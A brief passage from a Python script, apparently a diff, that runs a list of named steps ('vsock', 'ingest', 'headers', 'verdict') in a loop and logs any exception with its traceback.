+                ("vsock",s_vsock),("ingest",s_ingest),("headers",s_headers),("verdict",s_verdict)]:
         step(n,f)
 try: main()
 except Exception as e: w("!! %s"%e); w(traceback.format_exc())
